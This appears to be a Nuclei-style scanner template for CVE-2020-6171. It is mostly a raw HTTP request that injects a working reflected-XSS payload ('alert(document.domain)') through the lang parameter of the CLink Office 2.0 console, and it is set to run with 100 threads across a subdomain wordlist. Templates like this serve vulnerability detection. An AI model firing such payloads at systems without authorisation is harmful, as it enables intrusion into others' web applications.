id: CVE 2020-6171
info:
  author: pikpikcu
  description: 'A cross-site scripting (XSS) vulnerability in the index page of the
    CLink Office 2.0 management console allows remote attackers to inject arbitrary
    web script or HTML via the lang parameter.

    '
  name: CLink Office v2 XSS
  reference: https://nvd.nist.gov/vuln/detail/CVE-2020-6171
  severity: medium
  tags: cve,cve2020,xss,clink-office
requests:
- attack: sniper
  matchers:
  - part: body
    type: word
    words:
    - '"></script><script>alert(document.domain)</script>'
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
    HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Connection: close

    '
  threads: 100
